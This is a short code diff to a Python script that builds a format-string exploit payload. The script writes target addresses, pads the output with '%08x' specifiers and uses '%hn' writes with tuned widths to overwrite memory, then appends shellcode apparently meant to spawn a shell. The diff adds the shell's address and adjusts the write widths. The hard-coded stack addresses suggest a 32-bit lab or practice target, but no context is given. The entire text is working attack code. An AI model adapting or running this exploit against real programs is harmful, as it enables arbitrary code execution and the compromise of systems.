@@ -5,6 +5,8 @@ SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x
 
 ADDRESSTOWRITE = b'BFFFE58C'
                  #8C E5 FF BF
+ADDRESSOFSHELL = b'BFFFEA9D'
+
 ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
 ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
 ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
@@ -17,4 +19,4 @@ LENTGHOFREQUIRED = 61
 
 #print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%33529x' + b'%hn' + b'%29402x' +  b'%hn' + b'\n' + SHELLCODE)
+    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%34828x' + b'%hn' + b'%28105x' +  b'%hn' + b'\n' + SHELLCODE)
